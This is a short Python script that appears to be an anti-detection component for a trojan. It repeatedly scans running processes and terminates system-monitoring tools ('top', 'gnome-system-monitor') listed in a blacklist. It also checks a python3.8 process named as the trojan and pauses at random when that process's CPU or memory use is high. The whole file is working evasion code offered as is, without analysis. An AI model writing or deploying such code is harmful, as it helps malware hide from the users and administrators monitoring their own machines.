#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Created on Fri Oct 29 19:29:15 2021

@author: xcs
"""

import os
import platform
import psutil
import time,random

print(os.name,'\t',platform.platform())

blacklist=dict()
blacklist=['top','gnome-system-monitor']

while True:
    for proc in psutil.process_iter():
        try:
            pinfo=proc.as_dict(attrs=['pid','name','cpu_percent','memory_info'])
            
        except psutil.NoSuchProcess:
            pass
        else:
            if(pinfo['name']=='python3.8'):
                trojproc=psutil.Process(pinfo['pid'])
                if(trojproc.cpu_percent()>0.6 or trojproc.memory_percent()>5.0):
                    time.sleep(random.randint(5,15))
                                
            if pinfo['name'] in blacklist :
                print("[*]Found blacklisted program "+pinfo['name'])
                print("[*]Kill "+pinfo['name'])
                proc=psutil.Process(pinfo['pid'])
                proc.terminate()
                time.sleep(random.randint(1,10))
                
